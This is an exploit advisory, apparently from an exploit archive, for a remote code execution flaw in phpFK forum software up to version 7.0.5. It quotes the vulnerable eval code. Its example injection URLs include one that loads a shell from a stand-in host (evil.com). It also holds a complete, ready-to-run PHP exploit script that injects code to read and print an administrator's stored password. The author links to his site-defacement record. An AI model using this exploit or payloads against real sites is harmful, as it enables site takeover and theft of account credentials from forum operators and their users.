@@ -1,0 +1,115 @@
+id: 12849
+date: 06/22/2010
+title: phpFK <= v7.0.5 Remote Code Execution
+author: Lord-Anubis
+cves: 
+
+=====================================
+phpFK <= v7.0.5 Remote Code Execution
+=====================================
+
+
++-------------------------------------------------------------------------------------------------------------------------------+
+|				 _______         __                ______     							|
+|				|    |  |.--.--.|  |--..-----.    |      |.----..-----..--.--.--.				|
+|				|       ||  |  ||    < |  -__|    |   ---||   _||  -__||  |  |  |				|
+|				|__|____||_____||__|__||_____|    |______||__|  |_____||________|				|
++-------------------------------------------------------------------------------------------------------------------------------+
+| Name: phpFK <= v7.0.5 RCE													|
+| Software: phpFK <= v7.0.5													|
+| Site: http://frank-karau.de/													|
+| Download: http://frank-karau.de/download/phpfk_php_forum_7.05.zip								|
+| Vulnerability: Remote Code Execution												|
+| Severity: medium ( low / medium / high )											|
+| Tested on: v7.0.5														|
+| Dork: "Â© phpFK"														|
+| Requires: register_globals = On												|
++-------------------------------------------------------------------------------------------------------------------------------+
+| Author: Lord-Anubis														|
+| Contact: lord.anu bis4[at]gm ail[dot]com											|
+| Date: 21.06.2010 ( dd.mm.yyyy )												|
+| Site: http://lordanubis.altervista.org/											|
+| Defaces: http://www.zone-h.org/archive/notifier=Lord-Anubis									|
+| Exploits: http://inj3ct0r.com/author/2486											|
++-------------------------------------------------------------------------------------------------------------------------------+
+| Bug File: include/init.php													|
+| 25.	if (ini_get('register_globals'))											|
+| 26.	{															|
+| 27.		foreach($_GET as $s_name => $s_value)										|
+| 28.		{														|
+| 29.			eval('$'.$s_name.' = \'\';');										|
+| 30.		}														|
+| 31.		foreach($_POST as $s_name => $s_value)										|
+| 32.		{														|
+| 33.			eval('$'.$s_name.' = \'\';');										|
+| 34.		}														|
+| 35.	}															|
++-------------------------------------------------------------------------------------------------------------------------------+
+| Bug Explanation:														|
+|	- EN:	In the file include/init.php the register_globals being disabled by cycling the variables GET/POST and through	|
+|		the function eval they being overwritten and they will be unusables.... It's possible execute the code using	|
+|		the function eval. It's Sufficent insert some evil code in the variable GET/POST's Key.				|
+|		Examples:													|
+|		1) http://www.[site].com/[path]/index.php?a;require(str_replace('_',chr(46),'data/user/[nickAdmin].usr.ini'))?>	|
+|		2) http://www.[site].com/[path]/index.php?a;require(str_replace('_',chr(46),'http://www.evil.com/shell.txt'))?>	|
+|	////////////////////////////////////////////////////////////////////////////////////////////////////////////////////	|
+|	- ITA: 	Nel file include/init.php le register_globals vengono disabilitate ciclando la variabili GET/POST e tramite 	|
+|		la funzione eval vengono sovrascritte in modo da renderle inutilizzabili... Ð¸ possibile eseguire del codice 	|
+|		sfruttando la stessa funzione eval. BasterÐ° inserire del codice nocivo nella chiave della variabile GET/POST.	|
+|		Esempi validi sono:												|
+|		1) http://www.[site].com/[path]/index.php?a;require(str_replace('_',chr(46),'data/user/[nickAdmin].usr.ini'))?>	|
+|		2) http://www.[site].com/[path]/index.php?a;require(str_replace('_',chr(46),'http://www.evil.com/shell.txt'))?>	|
+|	////////////////////////////////////////////////////////////////////////////////////////////////////////////////////	|
+|	- PL:	...														|
++-------------------------------------------------------------------------------------------------------------------------------+
+| Exploit:															|
++-------------------------------------------------------------------------------------------------------------------------------+
+<?php
+/**
+ * exploit.php
+ *
+ * Software: phpFK <= v7.0.5
+ * Author: Lord-Anubis <lord.anu bis4[at]gm ail[dot]com>
+ * Vulnerability: Remote Code Execution
+ */
+
+//
+error_reporting(0);
+ini_set("max_execution_time", 0);
+
+//
+function codeExec() {
+	global $userName;
+	return "a;require(str_replace(%27_%27,chr(46),%27data/user/{$userName}.usr.ini%27))?%3E";
+}
+
+//
+if ($argc != 3) {
+	exit(
+		"[+] Software: phpFK <= v7.0.5\n".
+		"[+] Author: Lord-Anubis\n".
+		"[+] Vulnerability: Remote Code Execution\n".
+		"[+] Usage: ./exploit [hostName] [path] [evilUserName]\n".
+		"[+] Example:\n".
+		"[+] ./exploit 127.0.0.1 / admin\n".
+		"[+] ./exploit hostname.com /phpFK/ moderator\n"
+	);
+}
+
+//
+list($cli, $hostName, $path, $userName) = $argv
+
+//
+if (!preg_match('/password\=([a-zA-Z0-9]+)/is', file_get_contents("http://{$hostName}{$path}index.php?".codeExec()), $return)) {
+	exit("[-] Exploit failed\n");
+}
+
+//
+echo("[+] Password: {$return[1]}\n");
+echo("[+] Exploit successfull\n");
+exit;
+?>
+
+
+
+#  0day.today [2023-03-22]  #
